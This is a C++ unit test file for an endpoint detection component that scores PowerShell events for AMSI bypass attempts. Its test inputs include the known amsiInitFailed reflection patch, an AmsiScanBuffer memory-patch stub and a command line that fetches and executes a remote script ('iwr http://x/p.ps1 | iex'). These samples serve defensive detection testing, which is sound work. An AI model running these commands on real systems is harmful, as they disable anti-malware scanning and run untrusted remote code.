/*
 * amsi_bypass_detector_tests.cpp - Unit tests for AmsiBypassDetector.
 */
#include "amsi_bypass_detector_tests.h"

#include <windows.h>

#include <stdexcept>
#include <string>

#include "edr_event.h"
#include "event_bus.h"
#include "amsi_bypass_detector.h"

namespace {

#define AB_CHECK(condition) Check((condition), #condition, __LINE__)

void Check(bool condition, const char* expression, int line) {
    if (!condition)
        throw std::runtime_error(
            "amsi bypass detector test failed at line " +
            std::to_string(line) + ": " + expression);
}

edr::Event ProcEvent(uint64_t ts100ns, const char* image,
                     const char* commandLine) {
    edr::Event event;
    event.type = EDR_EVT_PROCESS_START;
    event.ts100ns = ts100ns;
    event.fields[edr::field::kType] = "PROCESS_START";
    event.fields[edr::field::kImage] = image;
    if (commandLine != nullptr)
        event.fields[edr::field::kCommandLine] = commandLine;
    return event;
}

/* House contract: a POWERSHELL_SCRIPT event carries its body ONLY in
 * kScriptBlockText - never kCommandLine/kImage. */
edr::Event ScriptEvent(uint64_t ts100ns, const char* scriptBody) {
    edr::Event event;
    event.type = EDR_EVT_POWERSHELL_SCRIPT;
    event.ts100ns = ts100ns;
    event.fields[edr::field::kType] = "POWERSHELL_SCRIPT";
    event.fields[edr::field::kScriptBlockText] = scriptBody;
    return event;
}

bool HasScore(const edr::Event& event) {
    return event.fields.find(edr::field::kAmsiBypassScore) !=
           event.fields.end();
}

constexpr uint64_t kSecond = 10000000ULL;

} // namespace

void RunAmsiBypassDetectorTests() {
    std::fprintf(stderr, "[amsi-bypass] TestDisabled\n");
    {
        /* Disabled detector never stamps. */
        edr::AmsiBypassDetector detector(false, 55, 300, 1024);
        edr::Event event = ScriptEvent(
            1000 * kSecond,
            "[Ref].Assembly.GetType('System.Management.Automation."
            "AmsiUtils').GetField('amsiInitFailed','NonPublic,Static')"
            ".SetValue($null,$true)");
        detector.Enrich(event);
        AB_CHECK(!HasScore(event));
    }
    std::fprintf(stderr, "[amsi-bypass] TestAmsiInitFailedPatch\n");
    {
        edr::AmsiBypassDetector detector(true, 55, 300, 1024);
        /* The canonical reflection flag patch -> 90. */
        edr::Event patch = ScriptEvent(
            1000 * kSecond,
            "[Ref].Assembly.GetType('System.Management.Automation."
            "AmsiUtils').GetField('amsiInitFailed','NonPublic,Static')"
            ".SetValue($null,$true)");
        detector.Enrich(patch);
        AB_CHECK(HasScore(patch));
        AB_CHECK(patch.fields.at(edr::field::kAmsiBypassScore) == "90");
        AB_CHECK(patch.fields.at(edr::field::kAmsiBypassVerdict) ==
                 "malicious");
        AB_CHECK(patch.fields.at(edr::field::kAmsiBypassSignals) ==
                 "AmsiInitFailed flag patched");

        /* Bare amsiInitFailed mention (write-up excerpt) -> 60. */
        edr::Event ref = ScriptEvent(
            2000 * kSecond,
            "notes on the amsiInitFailed field for the blue team");
        detector.Enrich(ref);
        AB_CHECK(HasScore(ref));
        AB_CHECK(ref.fields.at(edr::field::kAmsiBypassScore) == "60");
        AB_CHECK(ref.fields.at(edr::field::kAmsiBypassVerdict) ==
                 "suspicious");

        /* min_score above the reference band suppresses it. */
        edr::AmsiBypassDetector strict(true, 65, 300, 1024);
        edr::Event strictHit = ScriptEvent(
            3000 * kSecond,
            "notes on the amsiInitFailed field for the blue team");
        strict.Enrich(strictHit);
        AB_CHECK(!HasScore(strictHit));
    }
    std::fprintf(stderr, "[amsi-bypass] TestBufferStubPatch\n");
    {
        edr::AmsiBypassDetector detector(true, 55, 300, 1024);
        /* amsi.dll surface + memory-write primitive -> 85. */
        edr::Event stub = ScriptEvent(
            1000 * kSecond,
            "$h=Win32::LoadLibrary('amsi.dll'); VirtualProtect $addr;"
            " patch bytes at AmsiScanBuffer");
        detector.Enrich(stub);
        AB_CHECK(HasScore(stub));
        AB_CHECK(stub.fields.at(edr::field::kAmsiBypassScore) == "85");

        /* Bare AmsiScanBuffer reference -> 60 suspicious. */
        edr::Event ref = ProcEvent(
            2000 * kSecond,
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\"
            "powershell.exe",
            "powershell -c findstr AmsiScanBuffer notes.txt");
        detector.Enrich(ref);
        AB_CHECK(HasScore(ref));
        AB_CHECK(ref.fields.at(edr::field::kAmsiBypassScore) == "60");
        AB_CHECK(ref.fields.at(edr::field::kAmsiBypassVerdict) ==
                 "suspicious");
    }
    std::fprintf(stderr, "[amsi-bypass] TestHelperInvocation\n");
    {
        edr::AmsiBypassDetector detector(true, 55, 300, 1024);
        edr::Event helper = ScriptEvent(
            1000 * kSecond, "Import-Module .\\Bypass-Amsi.ps1");
        detector.Enrich(helper);
        AB_CHECK(HasScore(helper));
        AB_CHECK(helper.fields.at(edr::field::kAmsiBypassScore) == "80");
        AB_CHECK(helper.fields.at(edr::field::kAmsiBypassSignals) ==
                 "AMSI bypass helper invoked");
    }
    std::fprintf(stderr, "[amsi-bypass] TestReflectionPrep\n");
    {
        edr::AmsiBypassDetector detector(true, 55, 300, 1024);
        /* GetType against the internal AmsiUtils type -> 75. */
        edr::Event prep = ScriptEvent(
            1000 * kSecond,
            "$t=[Ref].Assembly.GetType('System.Management.Automation."
            "AmsiUtils')");
        detector.Enrich(prep);
        AB_CHECK(HasScore(prep));
        AB_CHECK(prep.fields.at(edr::field::kAmsiBypassScore) == "75");
        AB_CHECK(prep.fields.at(edr::field::kAmsiBypassVerdict) ==
                 "malicious");

        /* Benign AMSI mentions never fire: no bypass token families
         * present. */
        edr::Event benign = ScriptEvent(
            2000 * kSecond,
            "Get-WinEvent -LogName Microsoft-Windows-AMSI/Operational "
            "| Select -First 5");
        detector.Enrich(benign);
        AB_CHECK(!HasScore(benign));
    }
    std::fprintf(stderr, "[amsi-bypass] TestScriptFaceContract\n");
    {
        /* A POWERSHELL_SCRIPT event carries its body ONLY in
         * kScriptBlockText (house contract); such an event without any
         * body must stay silent rather than leak across faces. */
        edr::AmsiBypassDetector detector(true, 55, 300, 1024);
        edr::Event bodyless =
            ProcEvent(1000 * kSecond, "powershell.exe", nullptr);
        bodyless.type = EDR_EVT_POWERSHELL_SCRIPT;
        bodyless.fields[edr::field::kType] = "POWERSHELL_SCRIPT";
        detector.Enrich(bodyless);
        AB_CHECK(!HasScore(bodyless));

        /* PROCESS_START one-liner on the command plane does fire. */
        edr::Event cmdFace = ProcEvent(
            2000 * kSecond,
            "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\"
            "powershell.exe",
            "powershell -c Disable-Amsi; iwr http://x/p.ps1 | iex");
        detector.Enrich(cmdFace);
        AB_CHECK(HasScore(cmdFace));
    }
    std::fprintf(stderr, "[amsi-bypass] TestDedupAndBelowMin\n");
    {
        /* Identical script inside the dedup window fires once. */
        edr::AmsiBypassDetector detector(true, 55, 300, 1024);
        const char* body =
            "[Ref].Assembly.GetType('System.Management.Automation."
            "AmsiUtils').GetField('amsiInitFailed').SetValue($null,"
            "$true)";
        edr::Event first = ScriptEvent(1000 * kSecond, body);
        detector.Enrich(first);
        AB_CHECK(HasScore(first));

        edr::Event second = ScriptEvent(1010 * kSecond, body);
        detector.Enrich(second);
        AB_CHECK(!HasScore(second));

        /* Same script after the window closes fires again. */
        edr::Event later = ScriptEvent(1400 * kSecond, body);
        detector.Enrich(later);
        AB_CHECK(HasScore(later));
    }
    {
        /* min_score above all family scores suppresses stamping. */
        edr::AmsiBypassDetector detector(true, 95, 300, 1024);
        edr::Event event = ScriptEvent(
            1000 * kSecond,
            "[Ref].Assembly.GetType('System.Management.Automation."
            "AmsiUtils').GetField('amsiInitFailed','NonPublic,Static')"
            ".SetValue($null,$true)");
        detector.Enrich(event);
        AB_CHECK(!HasScore(event));
    }
    std::fprintf(stderr, "[amsi-bypass] all passed\n");
}
